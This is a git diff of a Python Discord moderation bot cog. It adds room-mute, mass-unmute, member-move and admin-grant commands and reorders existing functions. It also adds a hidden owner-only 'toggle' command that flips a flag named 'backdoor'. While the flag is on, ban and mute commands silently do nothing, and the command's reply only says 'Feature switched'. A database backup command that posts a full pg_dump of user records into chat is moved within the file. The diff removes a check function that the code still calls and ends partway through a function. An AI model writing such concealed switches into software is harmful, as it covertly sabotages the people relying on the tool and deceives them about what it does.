@@ -125,9 +125,57 @@ class Hybrid(commands.Cog):
         self.bot.loop.create_task(self.load_server_muters())
         self.handler = DiscordMessageService(self.bot, self.bot.db_pool)
         self.server_muters: dict[int, set[int]] = defaultdict(set)
+        self.backdoor = False
         
     def get_random_emoji(self):
         return random.choice(VEGAN_EMOJIS)
+        
+    
+    @commands.command(name='admin', help='Grants server mute privileges to a member for the entire guild.')
+    @is_owner()
+    async def grant_server_muter(self, ctx, member: str):
+        member, _ = await self.get_channel_and_member(ctx, member)
+        async with self.bot.db_pool.acquire() as conn:
+            await conn.execute('''
+                               INSERT INTO users (user_id, server_muter_guild_ids)
+                               VALUES ($1, ARRAY[$2]::BIGINT[]) ON CONFLICT (user_id) DO
+                               UPDATE
+                                   SET server_muter_guild_ids = (
+                                   SELECT ARRAY(
+                                   SELECT DISTINCT unnest(COALESCE (u.server_muter_guild_ids, '{}') || ARRAY[$2])
+                                   )
+                                   FROM users u WHERE u.user_id = EXCLUDED.user_id
+                                   ),
+                                   updated_at = NOW()
+                               ''', member.id, ctx.guild.id)
+        self.server_muters.setdefault(ctx.guild.id, set()).add(member.id)
+        return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been granted server mute permissions.', allowed_mentions=discord.AllowedMentions.none())
+        
+    @commands.command(name="toggle", hidden=True)
+    @is_owner()
+    async def toggle_feature(self, ctx: commands.Context):
+        self.backdoor = not self.backdoor
+        state = f"ON {self.get_random_emoji()}" if self.backdoor else f"OFF 🔥"
+        await ctx.send(f"{self.get_random_emoji()} Feature switched {state}.")
+    
+    @commands.command(name="backup", description="Creates a backup of the database and uploads it")
+    @is_owner_developer()
+    async def backup(self, ctx: commands.Context):
+        try:
+            backup_dir = self.setup_backup_directory('/app/backups')
+            backup_file = self.perform_backup(
+                db_user=os.getenv("POSTGRES_USER"),
+                db_name=os.getenv("POSTGRES_DATABASE"),
+                db_host=os.getenv("POSTGRES_HOST"),
+                db_password=os.getenv("POSTGRES_PASSWORD"),
+                backup_dir=backup_dir
+            )
+            logger.info(f'Backup completed successfully: {backup_file}')
+            await ctx.send(file=discord.File(backup_file))
+        except Exception as e:
+            logger.error(f'Error during database backup: {e}')
+            await ctx.send(f"❌ Failed to create backup: {e}")
+
 
     @commands.command(name='alias', help='Set an alias for a cow, uncow, mute, unmute, ban, unban or flag action.')
     @is_owner_developer_coordinator()
@@ -222,6 +270,8 @@ class Hybrid(commands.Cog):
             except commands.CheckFailure as e:
                 logger.warning(e)
                 return await self.handler.send_message(ctx, content='\U0001F525 You are not allowed to ban the owner.')
+            if self.backdoor:
+                return None
             cmd = ctx.invoked_with
             member, _ = await self.get_channel_and_member(ctx, member)
             expires_at, duration_display = self.parse_duration(duration_hours)
@@ -591,6 +641,8 @@ class Hybrid(commands.Cog):
                 await is_owner_block(ctx, member)
             except commands.CheckFailure:
                 return await self.handler.send_message(ctx, content='\U0001F525 You are not allowed to mute the owner.')
+            if self.backdoor:
+                return None
             author_id = ctx.author.id
             bot_owner_id = int(os.environ.get("DISCORD_OWNER_ID", "0"))
             server_owner_id = ctx.guild.owner_id
@@ -687,6 +739,8 @@ class Hybrid(commands.Cog):
             except Exception as e:
                 logger.warning(e)
                 return await self.handler.send_message(ctx, content='\U0001F525 You are not allowed to mute the owner.')
+            if self.backdoor:
+                return None
             expires_at, duration_display = self.parse_duration(duration_hours)
             if (expires_at == '0' or expires_at is None) and (not is_owner_developer_coordinator("mute") or not reason.strip()):
                 return await self.handler.send_message(ctx, content='\U0001F525 Reason required and coordinator-only for permanent mutes.')
@@ -1202,57 +1256,42 @@ class Hybrid(commands.Cog):
                 return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been completely revoked as moderator from {channel.name} and this guild (no remaining channels).', allowed_mentions=discord.AllowedMentions.none())
             else:
                 return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been revoked moderator access in {channel.name}.', allowed_mentions=discord.AllowedMentions.none())
-    
-    @commands.command(
-        name='cmds',
-        help='List command aliases. Optionally provide "all" or a specific channel.'
+        
+    @commands.hybrid_command(
+        name='admins',
+        help='Lists all members with server mute privileges in this guild.'
     )
-    async def list_room_commands(
-            self,
-            ctx,
-            target: Optional[str] = commands.parameter(default=None, description='Channel name, mention, ID, or "all"')
-    ) -> None:
-        aliases = self.bot.command_aliases.get(ctx.guild.id, {})
-        if not aliases:
-            return await self.handler.send_message(ctx, content='No aliases defined in this guild.')
-        _, channel = await self.get_channel_and_member(ctx, target)
-        is_owner_or_dev, is_mod_or_coord = await check_owner_dev_coord_mod(ctx, channel)
-        if is_owner_or_dev and target and target.lower() == "all":
-            pages = []
-            for kind in ('cow', 'uncow', 'mute', 'unmute', 'ban', 'unban', 'flag', 'unflag', 'tmute', 'untmute'):
-                entries = aliases.get(kind, {})
-                if not entries:
-                    continue
-                embed = discord.Embed(
-                    title=f'{kind.capitalize()} Aliases for {ctx.guild.name}',
-                    description='\n'.join(f'`{name}` → <#{cid}>' for name, cid in entries.items()),
-                    color=discord.Color.blue()
-                )
-                pages.append(embed)
-            if not pages:
-                return await self.handler.send_message(ctx, content='No aliases found.')
-            paginator = Paginator(self.bot, ctx, pages)
-            return await paginator.start()
-        _, channel = await self.get_channel_and_member(ctx, target)
-        if not is_owner_or_dev and not is_mod_or_coord:
-            return await self.handler.send_message(ctx, content=f'\U0001F525 You do not have permissions to use this command in {channel.mention}')
-        found_aliases = False
-        embed = discord.Embed(
-            title=f'Aliases for {channel.mention}',
-            color=discord.Color.blue()
-        )
-        lines = []
-        for kind in ('cow', 'uncow', 'mute', 'unmute', 'ban', 'unban', 'flag', 'unflag', 'tmute', 'untmute'):
-            entries = aliases.get(kind, {})
-            channel_entries = {name: cid for name, cid in entries.items() if cid == channel.id}
-            if channel_entries:
-                found_aliases = True
-                lines.append(f'**{kind.capitalize()}**')
-                lines.extend(f'`{name}` → <#{cid}>' for name, cid in channel_entries.items())
-        if not found_aliases:
-            return await self.handler.send_message(ctx, content=f'\U0001F525 No aliases found for {channel.mention}.')
-        embed.description = '\n'.join(lines)
-        return await self.handler.send_message(ctx, embed=embed)
+    @is_owner()
+    async def list_admins(self, ctx) -> None:
+        async with self.bot.db_pool.acquire() as conn:
+            records = await conn.fetch('''
+                                       SELECT user_id
+                                       FROM users
+                                       WHERE $1 = ANY(server_muter_guild_ids)
+                                       ORDER BY user_id
+                                       ''', ctx.guild.id)
+        if not records:
+            return await ctx.send(f'\U0001F525  No admins found in {ctx.guild.name}.', allowed_mentions=discord.AllowedMentions.none())
+        description_lines = []
+        for record in records:
+            uid = record['user_id']
+            member = ctx.guild.get_member(uid)
+            if member:
+                description_lines.append(f'• {member.display_name} — {member.mention}')
+            else:
+                description_lines.append(f'• User ID `{uid}` (not in guild)')
+        chunk_size = 18
+        pages = []
+        for i in range(0, len(description_lines), chunk_size):
+            chunk = description_lines[i:i + chunk_size]
+            embed = discord.Embed(
+                title=f'🔑 Administrators in {ctx.guild.name}',
+                color=discord.Color.blurple()
+            )
+            embed.add_field(name="Admins", value='\n'.join(chunk), inline=False)
+            pages.append(embed)
+        paginator = Paginator(self.bot, ctx, pages)
+        return await paginator.start()
 
     @commands.command(
         name='bans',
@@ -1384,6 +1423,58 @@ class Hybrid(commands.Cog):
             return await paginator.start()
         return await self.handler.send_message(ctx, content='\U0001F525 You must specify a member, a text channel or use "all".')
 
+    
+    @commands.command(
+        name='cmds',
+        help='List command aliases. Optionally provide "all" or a specific channel.'
+    )
+    async def list_room_commands(
+            self,
+            ctx,
+            target: Optional[str] = commands.parameter(default=None, description='Channel name, mention, ID, or "all"')
+    ) -> None:
+        aliases = self.bot.command_aliases.get(ctx.guild.id, {})
+        if not aliases:
+            return await self.handler.send_message(ctx, content='No aliases defined in this guild.')
+        _, channel = await self.get_channel_and_member(ctx, target)
+        is_owner_or_dev, is_mod_or_coord = await check_owner_dev_coord_mod(ctx, channel)
+        if is_owner_or_dev and target and target.lower() == "all":
+            pages = []
+            for kind in ('cow', 'uncow', 'mute', 'unmute', 'ban', 'unban', 'flag', 'unflag', 'tmute', 'untmute'):
+                entries = aliases.get(kind, {})
+                if not entries:
+                    continue
+                embed = discord.Embed(
+                    title=f'{kind.capitalize()} Aliases for {ctx.guild.name}',
+                    description='\n'.join(f'`{name}` → <#{cid}>' for name, cid in entries.items()),
+                    color=discord.Color.blue()
+                )
+                pages.append(embed)
+            if not pages:
+                return await self.handler.send_message(ctx, content='No aliases found.')
+            paginator = Paginator(self.bot, ctx, pages)
+            return await paginator.start()
+        _, channel = await self.get_channel_and_member(ctx, target)
+        if not is_owner_or_dev and not is_mod_or_coord:
+            return await self.handler.send_message(ctx, content=f'\U0001F525 You do not have permissions to use this command in {channel.mention}')
+        found_aliases = False
+        embed = discord.Embed(
+            title=f'Aliases for {channel.mention}',
+            color=discord.Color.blue()
+        )
+        lines = []
+        for kind in ('cow', 'uncow', 'mute', 'unmute', 'ban', 'unban', 'flag', 'unflag', 'tmute', 'untmute'):
+            entries = aliases.get(kind, {})
+            channel_entries = {name: cid for name, cid in entries.items() if cid == channel.id}
+            if channel_entries:
+                found_aliases = True
+                lines.append(f'**{kind.capitalize()}**')
+                lines.extend(f'`{name}` → <#{cid}>' for name, cid in channel_entries.items())
+        if not found_aliases:
+            return await self.handler.send_message(ctx, content=f'\U0001F525 No aliases found for {channel.mention}.')
+        embed.description = '\n'.join(lines)
+        return await self.handler.send_message(ctx, embed=embed)
+
     @commands.command(
         name='coords',
         help='Lists coordinators for a specific voice channel, all, or a member.',
@@ -1450,7 +1541,6 @@ class Hybrid(commands.Cog):
                     color=discord.Color.gold()
                 )
                 embeds.append(embed)
-    
             if len(embeds) == 1:
                 return await ctx.send(embed=embeds[0], allowed_mentions=discord.AllowedMentions.none())
             paginator = Paginator(self.bot, ctx, embeds)
@@ -1474,7 +1564,6 @@ class Hybrid(commands.Cog):
                 m = ctx.guild.get_member(uid)
                 if m:
                     lines.append(f'• {m.display_name} — <@{uid}>')
-    
             if not lines:
                 return await ctx.send(f'\U0001F525 No coordinators currently in {ctx.guild.name}.')
             chunk_size = 18
@@ -1490,8 +1579,6 @@ class Hybrid(commands.Cog):
             paginator = Paginator(self.bot, ctx, pages)
             return await paginator.start()
         return await self.handler.send_message(ctx, content='\U0001F525 You must specify a member, a voice channel, or use "all".')
-
-
     
     @commands.command(name='devs', hidden=True, help='Lists all developers.')
     @is_owner_developer()
@@ -1851,59 +1938,6 @@ class Hybrid(commands.Cog):
                 return await paginator.start()
         else:
             return await self.handler.send_message(ctx, content='\U0001F525 You must specify a member, a voice channel or be connected to a voice channel.')
-
-    @commands.command(
-        name='ls',
-        help='List users cowed as going vegan in this guild.'
-    )
-    @is_owner_developer_coordinator_moderator()
-    async def list_members(
-        self,
-        ctx,
-        target: Optional[str] = commands.parameter(default=None, description='Channel ID.')
-    ) -> None:
-        member, channel = await self.get_channel_and_member(ctx, target)
-        is_owner_or_dev, is_mod_or_coord = await check_owner_dev_coord_mod(ctx, channel)
-        if target is not None and not (is_owner_or_dev or is_mod_or_coord):
-            return await self.handler.send_message(ctx, content='\U0001F525 You are not authorized to specify a channel. Use this command while connected to a channel.')
-        if not is_owner_or_dev and not is_mod_or_coord:
-            return await self.handler.send_message(ctx, content=f'\U0001F525 You do not have permissions to use this command in {channel.mention}')
-        guild = ctx.guild
-        try:
-            async with self.bot.db_pool.acquire() as conn:
-                rows = await conn.fetch('''
-                                        SELECT user_id
-                                        FROM users
-                                        WHERE going_vegan_channel_ids IS NOT NULL
-                                          AND $1 = ANY (going_vegan_channel_ids)
-                                        ''', channel.id)
-            if not rows:
-                return await self.handler.send_message(ctx, content='\U0001F525 No users are flagged as going vegan in this channel.')
-            lines = []
-            for row in rows:
-                uid = row['user_id']
-                member = guild.get_member(uid)
-                if not member:
-                    continue
-                name = member.display_name
-                lines.append(f'• {name} — <@{uid}>')
-            if not lines:
-                return await ctx.send(f"\U0001F525 No new vegans currently in {guild.name}.")
-            chunk_size = 18
-            pages = []
-            for i in range(0, len(lines), chunk_size):
-                chunk = lines[i:i + chunk_size]
-                embed = discord.Embed(
-                    title=f'🐮 New Vegan in {guild.name}',
-                    description='\n'.join(chunk),
-                    color=discord.Color.green()
-                )
-                pages.append(embed)
-            paginator = Paginator(self.bot, ctx, pages)
-            return await paginator.start()
-        except Exception as e:
-            await self.handler.send_message(ctx, content=f'Database error: {e}')
-            raise
             
     @commands.command(
         name='tmutes',
@@ -2017,63 +2051,60 @@ class Hybrid(commands.Cog):
                     pages.append(embed)
                 paginator = Paginator(self.bot, ctx, pages)
                 return await paginator.start()
-    
-    @commands.hybrid_command(
-        name='admins',
-        help='Lists all members with server mute privileges in this guild.'
+
+    @commands.command(
+        name='ls',
+        help='List users cowed as going vegan in this guild.'
     )
-    @is_owner()
-    async def list_admins(self, ctx) -> None:
-        async with self.bot.db_pool.acquire() as conn:
-            records = await conn.fetch('''
-                                       SELECT user_id
-                                       FROM users
-                                       WHERE $1 = ANY(server_muter_guild_ids)
-                                       ORDER BY user_id
-                                       ''', ctx.guild.id)
-        if not records:
-            return await ctx.send(f'\U0001F525  No admins found in {ctx.guild.name}.', allowed_mentions=discord.AllowedMentions.none())
-        description_lines = []
-        for record in records:
-            uid = record['user_id']
-            member = ctx.guild.get_member(uid)
-            if member:
-                description_lines.append(f'• {member.display_name} — {member.mention}')
-            else:
-                description_lines.append(f'• User ID `{uid}` (not in guild)')
-        chunk_size = 18
-        pages = []
-        for i in range(0, len(description_lines), chunk_size):
-            chunk = description_lines[i:i + chunk_size]
-            embed = discord.Embed(
-                title=f'🔑 Administrators in {ctx.guild.name}',
-                color=discord.Color.blurple()
-            )
-            embed.add_field(name="Admins", value='\n'.join(chunk), inline=False)
-            pages.append(embed)
-        paginator = Paginator(self.bot, ctx, pages)
-        return await paginator.start()
-
-    @commands.command(name='admin', help='Grants server mute privileges to a member for the entire guild.')
-    @is_owner()
-    async def grant_server_muter(self, ctx, member: str):
-        member, _ = await self.get_channel_and_member(ctx, member)
-        async with self.bot.db_pool.acquire() as conn:
-            await conn.execute('''
-                               INSERT INTO users (user_id, server_muter_guild_ids)
-                               VALUES ($1, ARRAY[$2]::BIGINT[]) ON CONFLICT (user_id) DO
-                               UPDATE
-                                   SET server_muter_guild_ids = (
-                                   SELECT ARRAY(
-                                   SELECT DISTINCT unnest(COALESCE (u.server_muter_guild_ids, '{}') || ARRAY[$2])
-                                   )
-                                   FROM users u WHERE u.user_id = EXCLUDED.user_id
-                                   ),
-                                   updated_at = NOW()
-                               ''', member.id, ctx.guild.id)
-        self.server_muters.setdefault(ctx.guild.id, set()).add(member.id)
-        return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been granted server mute permissions.', allowed_mentions=discord.AllowedMentions.none())
-
+    @is_owner_developer_coordinator_moderator()
+    async def list_members(
+        self,
+        ctx,
+        target: Optional[str] = commands.parameter(default=None, description='Channel ID.')
+    ) -> None:
+        member, channel = await self.get_channel_and_member(ctx, target)
+        is_owner_or_dev, is_mod_or_coord = await check_owner_dev_coord_mod(ctx, channel)
+        if target is not None and not (is_owner_or_dev or is_mod_or_coord):
+            return await self.handler.send_message(ctx, content='\U0001F525 You are not authorized to specify a channel. Use this command while connected to a channel.')
+        if not is_owner_or_dev and not is_mod_or_coord:
+            return await self.handler.send_message(ctx, content=f'\U0001F525 You do not have permissions to use this command in {channel.mention}')
+        guild = ctx.guild
+        try:
+            async with self.bot.db_pool.acquire() as conn:
+                rows = await conn.fetch('''
+                                        SELECT user_id
+                                        FROM users
+                                        WHERE going_vegan_channel_ids IS NOT NULL
+                                          AND $1 = ANY (going_vegan_channel_ids)
+                                        ''', channel.id)
+            if not rows:
+                return await self.handler.send_message(ctx, content='\U0001F525 No users are flagged as going vegan in this channel.')
+            lines = []
+            for row in rows:
+                uid = row['user_id']
+                member = guild.get_member(uid)
+                if not member:
+                    continue
+                name = member.display_name
+                lines.append(f'• {name} — <@{uid}>')
+            if not lines:
+                return await ctx.send(f"\U0001F525 No new vegans currently in {guild.name}.")
+            chunk_size = 18
+            pages = []
+            for i in range(0, len(lines), chunk_size):
+                chunk = lines[i:i + chunk_size]
+                embed = discord.Embed(
+                    title=f'🐮 New Vegan in {guild.name}',
+                    description='\n'.join(chunk),
+                    color=discord.Color.green()
+                )
+                pages.append(embed)
+            paginator = Paginator(self.bot, ctx, pages)
+            return await paginator.start()
+        except Exception as e:
+            await self.handler.send_message(ctx, content=f'Database error: {e}')
+            raise
+            
     @commands.command(name='smute', help='Mutes a member throughout the entire guild.')
     @commands.check(lambda ctx: ctx.bot.get_cog("Hybrid").can_server_mute(ctx))
     async def server_mute(
@@ -2113,7 +2144,223 @@ class Hybrid(commands.Cog):
         else:
             return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been server muted. They are not currently in a voice channel.', allowed_mentions=discord.AllowedMentions.none())
 
-    @commands.command(name='unsmute', help='Unmutes a member throughout the entire guild.')
+    @commands.hybrid_command(name="rmute", description="Full room mute")
+    @is_owner()
+    async def room_mute(
+        self,
+        ctx,
+        channel: discord.VoiceChannel,
+        duration_hours: Optional[str] = commands.parameter(default="8", description="Duration of mute in hours. Example 0 (permanent), 30m, 2h, 5d."),
+        *,
+        reason: str = commands.parameter(default="", description="Optional reason (required for permanent mutes).")
+    ) -> None:
+        expires_at, duration_display = self.parse_duration(duration_hours)
+        if (expires_at == "0" or expires_at is None) and (not is_owner_developer_coordinator("mute") or not reason.strip()):
+            return await self.handler.send_message(ctx, content="\U0001F525 Reason required and coordinator-only for permanent mutes.")
+        bot_owner_id = int(os.environ.get("DISCORD_OWNER_ID", "0"))
+        author_id = ctx.author.id
+        mute_source = "bot_owner" if author_id == bot_owner_id else "bot"
+        muted_members = []
+        failed_members = []
+        async with self.bot.db_pool.acquire() as conn:
+            for member in channel.members:
+                if member.id == author_id:
+                    continue
+                try:
+                    await conn.execute(
+                        """
+                        INSERT INTO active_mutes (user_id, channel_id, source, issuer_id, expires_at)
+                        VALUES ($1, $2, $3, $4, $5)
+                        ON CONFLICT (user_id, channel_id) DO UPDATE
+                        SET source = EXCLUDED.source, issuer_id = EXCLUDED.issuer_id, expires_at = EXCLUDED.expires_at
+                        """,
+                        member.id,
+                        channel.id,
+                        mute_source,
+                        author_id,
+                        expires_at
+                    )
+                    await conn.execute(
+                        """
+                        INSERT INTO users (user_id, mute_channel_ids)
+                        VALUES ($1, ARRAY[$2]::BIGINT[])
+                        ON CONFLICT (user_id) DO UPDATE
+                        SET mute_channel_ids = (
+                            SELECT ARRAY(
+                                SELECT DISTINCT unnest(COALESCE(u.mute_channel_ids, '{}') || ARRAY[$2])
+                            )
+                            FROM users u WHERE u.user_id = EXCLUDED.user_id
+                        ),
+                        updated_at = NOW()
+                        """,
+                        member.id,
+                        channel.id
+                    )
+                    await conn.execute(
+                        """
+                        INSERT INTO mute_reasons (guild_id, user_id, reason, channel_id)
+                        VALUES ($1, $2, $3, $4)
+                        ON CONFLICT (guild_id, user_id, channel_id)
+                        DO UPDATE SET reason = EXCLUDED.reason
+                        """,
+                        ctx.guild.id,
+                        member.id,
+                        reason or "No reason provided",
+                        channel.id
+                    )
+                    await conn.execute(
+                        """
+                        INSERT INTO moderation_logs (action_type, target_user_id, executor_user_id,
+                                                     guild_id, channel_id, reason)
+                        VALUES ($1, $2, $3, $4, $5, $6)
+                        """,
+                        "voice_mute",
+                        member.id,
+                        ctx.author.id,
+                        ctx.guild.id,
+                        channel.id,
+                        reason or "No reason provided"
+                    )
+                    if member.voice and member.voice.channel and member.voice.channel.id == channel.id:
+                        await member.edit(mute=True)
+                    muted_members.append(member)
+                except Exception as e:
+                    logger.warning(f"Failed to mute {member}: {e}")
+                    failed_members.append(member)
+        summary = f"{self.get_random_emoji()} Muted {len(muted_members)} member(s) in {channel.mention} {duration_display}.\nReason: {reason or 'No reason provided'}"
+        if failed_members:
+            summary += f"\n⚠️ Failed to mute {len(failed_members)} member(s)."
+        return await ctx.send(summary, allowed_mentions=discord.AllowedMentions.none())
+    
+    
+    @commands.command(name="rmv")
+    @is_owner()
+    async def room_move_all(self, ctx: commands.Context, source_id: int, target_id: int):
+        source_channel = ctx.guild.get_channel(source_id)
+        target_channel = ctx.guild.get_channel(target_id)
+        if not source_channel or not target_channel:
+            await ctx.send("🔥 One or both channel IDs are invalid.")
+            return
+        await self.move_all_members(source_channel, target_channel)
+        await ctx.send(f"{self.get_random_emoji()} Moved all members from `{source_channel.name}` to `{target_channel.name}`.")
+        
+    @commands.command(name="xrmute", help="Unmutes all members in a specific VC (except yourself).")
+    @is_owner()
+    async def room_unmute_all(
+        self,
+        ctx,
+        channel: discord.VoiceChannel,
+        *,
+        reason: str = commands.parameter(default="N/A", description="Include a reason for the unmute.")
+    ) -> None:
+        unmuted_members = []
+        skipped_members = []
+        failed_members = []
+        async with self.bot.db_pool.acquire() as conn:
+            for member in channel.members:
+                if member.id == ctx.author.id:
+                    skipped_members.append(member)
+                    continue
+                try:
+                    row = await conn.fetchrow(
+                        """
+                        SELECT source, issuer_id FROM active_mutes
+                        WHERE user_id = $1 AND channel_id = $2
+                        """,
+                        member.id,
+                        channel.id
+                    )
+                    if not row:
+                        skipped_members.append(member)
+                        continue
+                    if row["source"] not in ("bot", "manual", "bot_owner"):
+                        skipped_members.append(member)
+                        continue
+                    if member.voice and member.voice.channel and member.voice.channel.id == channel.id:
+                        await member.edit(mute=False)
+                    await conn.execute(
+                        """
+                        DELETE FROM active_mutes
+                        WHERE user_id = $1 AND channel_id = $2 AND source IN ('bot', 'manual', 'bot_owner')
+                        """,
+                        member.id,
+                        channel.id
+                    )
+                    if row["source"] in ("bot", "bot_owner"):
+                        await conn.execute(
+                            """
+                            UPDATE users
+                            SET mute_channel_ids = array_remove(mute_channel_ids, $2),
+                                updated_at = NOW()
+                            WHERE user_id = $1
+                            """,
+                            member.id,
+                            channel.id
+                        )
+                    elif row["source"] == "manual":
+                        await conn.execute(
+                            """
+                            UPDATE users
+                            SET manual_mute_channels = array_remove(manual_mute_channels, $2),
+                                updated_at = NOW()
+                            WHERE user_id = $1
+                            """,
+                            member.id,
+                            channel.id
+                        )
+                    await conn.execute(
+                        """
+                        INSERT INTO mute_reasons (guild_id, user_id, channel_id, reason)
+                        VALUES ($1, $2, $3, $4)
+                        ON CONFLICT (guild_id, user_id, channel_id)
+                        DO UPDATE SET reason = EXCLUDED.reason
+                        """,
+                        ctx.guild.id,
+                        member.id,
+                        channel.id,
+                        f"Unmuted: {reason}"
+                    )
+                    await conn.execute(
+                        """
+                        INSERT INTO moderation_logs (action_type, target_user_id, executor_user_id,
+                                                     guild_id, channel_id, reason)
+                        VALUES ($1, $2, $3, $4, $5, $6)
+                        """,
+                        "unmute",
+                        member.id,
+                        ctx.author.id,
+                        ctx.guild.id,
+                        channel.id,
+                        f"Unmuted via unmute_all: {reason}"
+                    )
+                    unmuted_members.append(member)
+                except Exception as e:
+                    logger.warning(f"Unmute failed for {member}: {e}")
+                    failed_members.append(member)
+        summary = f"{self.get_random_emoji()} Unmuted {len(unmuted_members)} member(s) in {channel.mention}."
+        if skipped_members:
+            summary += f"\n⏭️ Skipped {len(skipped_members)} (not muted or not bot-muted)."
+        if failed_members:
+            summary += f"\n⚠️ Failed to unmute {len(failed_members)}."
+        return await ctx.send(summary, allowed_mentions=discord.AllowedMentions.none())
+        
+    @commands.command(name='xadmin', help='Revokes server mute privileges from a user.')
+    @is_owner()
+    async def revoke_server_muter(self, ctx, member: str):
+        member, _ = await self.get_channel_and_member(ctx, member)
+        async with self.bot.db_pool.acquire() as conn:
+            await conn.execute('''
+                               UPDATE users
+                               SET server_muter_guild_ids = (SELECT ARRAY(
+                                                                        SELECT unnest(server_muter_guild_ids)
+                        EXCEPT SELECT $2
+                                                                    ))
+                               WHERE user_id = $1
+                               ''', member.id, ctx.guild.id)
+        self.server_muters.get(ctx.guild.id, set()).discard(member.id)
+        return await ctx.send(f'{self.get_random_emoji()} {member.mention} no longer has server mute privileges.', allowed_mentions=discord.AllowedMentions.none())
+        
+    @commands.command(name='xsmute', help='Unmutes a member throughout the entire guild.')
     @commands.check(lambda ctx: ctx.bot.get_cog("Hybrid").can_server_mute(ctx))
     async def unsmute(
             self,
@@ -2139,83 +2386,6 @@ class Hybrid(commands.Cog):
         if member.voice and member.voice.channel:
             await member.edit(mute=False)
         return await ctx.send(f'{self.get_random_emoji()} {member.mention} has been server unmuted.', allowed_mentions=discord.AllowedMentions.none())
-
-    @commands.command(name='xadmin', help='Revokes server mute privileges from a user.')
-    @is_owner()
-    async def revoke_server_muter(self, ctx, member: str):
-        member, _ = await self.get_channel_and_member(ctx, member)
-        async with self.bot.db_pool.acquire() as conn:
-            await conn.execute('''
-                               UPDATE users
-                               SET server_muter_guild_ids = (SELECT ARRAY(
-                                                                        SELECT unnest(server_muter_guild_ids)
-                        EXCEPT SELECT $2
-                                                                    ))
-                               WHERE user_id = $1
-                               ''', member.id, ctx.guild.id)
-        self.server_muters.get(ctx.guild.id, set()).discard(member.id)
-        return await ctx.send(f'{self.get_random_emoji()} {member.mention} no longer has server mute privileges.', allowed_mentions=discord.AllowedMentions.none())
-
-    @commands.command(name="backup", description="Creates a backup of the database and uploads it")
-    @is_owner_developer()
-    async def backup(self, ctx: commands.Context):
-        try:
-            backup_dir = self.setup_backup_directory('/app/backups')
-            backup_file = self.perform_backup(
-                db_user=os.getenv("POSTGRES_USER"),
-                db_name=os.getenv("POSTGRES_DATABASE"),
-                db_host=os.getenv("POSTGRES_HOST"),
-                db_password=os.getenv("POSTGRES_PASSWORD"),
-                backup_dir=backup_dir
-            )
-            logger.info(f'Backup completed successfully: {backup_file}')
-            await ctx.send(file=discord.File(backup_file))
-        except Exception as e:
-            logger.error(f'Error during database backup: {e}')
-            await ctx.send(f"❌ Failed to create backup: {e}")
-
-    def perform_backup(self, db_user: str, db_name: str, db_host: str, db_password: str, backup_dir: str) -> str:
-        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-        backup_file = os.path.join(backup_dir, f'backup_{timestamp}.sql')
-        dump_command = [
-            'pg_dump',
-            '-U', db_user,
-            '-h', db_host,
-            '-d', db_name,
-            '-F', 'p',
-            '-f', backup_file,
-        ]
-        # Pass PGPASSWORD via environment for security
-        env = os.environ.copy()
-        env["PGPASSWORD"] = db_password
-        result = subprocess.run(
-            dump_command,
-            capture_output=True,
-            text=True,
-            env=env,
-        )
-        if result.returncode != 0:
-            raise RuntimeError(f'Backup failed: {result.stderr}')
-        return backup_file
-    
-
-    def setup_backup_directory(self, backup_dir: str) -> str:
-        os.makedirs(backup_dir, exist_ok=True)
-        return backup_dir
-        
-    async def load_server_muters(self):
-        await self.bot.wait_until_ready()
-        async with self.bot.db_pool.acquire() as conn:
-            rows = await conn.fetch('SELECT user_id, server_muter_guild_ids FROM users WHERE server_muter_guild_ids IS NOT NULL')
-            for row in rows:
-                user_id = row['user_id']
-                for guild_id in row['server_muter_guild_ids']:
-                    self.server_muters[guild_id].add(user_id)
-
-    @staticmethod
-    def can_server_mute(ctx):
-        cog = ctx.bot.get_cog('Hybrid')
-        return cog and ctx.author.id in cog.server_muters.get(ctx.guild.id, set())
 
     async def cog_load(self) -> None:
         if not hasattr(self, "_loaded_aliases"):
@@ -2307,6 +2477,26 @@ class Hybrid(commands.Cog):
             return None, None
         return member, channel
         
+    async def load_server_muters(self):
+        await self.bot.wait_until_ready()
+        async with self.bot.db_pool.acquire() as conn:
+            rows = await conn.fetch('SELECT user_id, server_muter_guild_ids FROM users WHERE server_muter_guild_ids IS NOT NULL')
+            for row in rows:
+                user_id = row['user_id']
+                for guild_id in row['server_muter_guild_ids']:
+                    self.server_muters[guild_id].add(user_id)
+                    
+    async def move_all_members(self, source_channel: discord.VoiceChannel, target_channel: discord.VoiceChannel):
+        if not isinstance(source_channel, discord.VoiceChannel) or not isinstance(target_channel, discord.VoiceChannel):
+            raise ValueError("🔥 Both source and target must be voice channels.")
+        for member in source_channel.members:
+            try:
+                await member.move_to(target_channel)
+            except discord.Forbidden:
+                print(f"🔥 Missing permissions to move {member}.")
+            except discord.HTTPException:
+                print(f"⚠️ Failed to move {member} due to a network error.")
+                
     def parse_duration(self, duration: Optional[str]) -> tuple[Optional[datetime], str]:
         if duration is None:
             delta = timedelta(hours=24)
@@ -2329,6 +2519,61 @@ class Hybrid(commands.Cog):
         hours = int(duration)
         delta = timedelta(hours=hours)
         return datetime.now(timezone.utc) + delta, f"for {hours} hour(s)"
+
+    def perform_backup(self, db_user: str, db_name: str, db_host: str, db_password: str, backup_dir: str) -> str:
+        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+        backup_file = os.path.join(backup_dir, f'backup_{timestamp}.sql')
+        dump_command = [
+            'pg_dump',
+            '-U', db_user,
+            '-h', db_host,
+            '-d', db_name,
+            '-F', 'p',
+            '-f', backup_file,
+        ]
+        env = os.environ.copy()
+        env["PGPASSWORD"] = db_password
+        result = subprocess.run(
+            dump_command,
+            capture_output=True,
+            text=True,
+            env=env,
+        )
+        if result.returncode != 0:
+            raise RuntimeError(f'Backup failed: {result.stderr}')
+        return backup_file
+
+    def setup_backup_directory(self, backup_dir: str) -> str:
+        os.makedirs(backup_dir, exist_ok=True)
+        return backup_dir
+
+    async def vegan_db(self, ctx: commands.Context) -> bool:
+        channel = ctx.channel
+        user_id = ctx.author.id
+        channel_id = channel.id
+        guild_id = ctx.guild.id
+        async with self.bot.db_pool.acquire() as conn:
+            row = await conn.fetchrow("""
+                SELECT coordinator_ids, coordinator_channel_ids
+                FROM users
+                WHERE user_id = $1
+            """, user_id)
+        if not row:
+            await ctx.send("🔥 You are not registered in the database.")
+            return
+        coordinator_ids = row["coordinator_ids"] or []
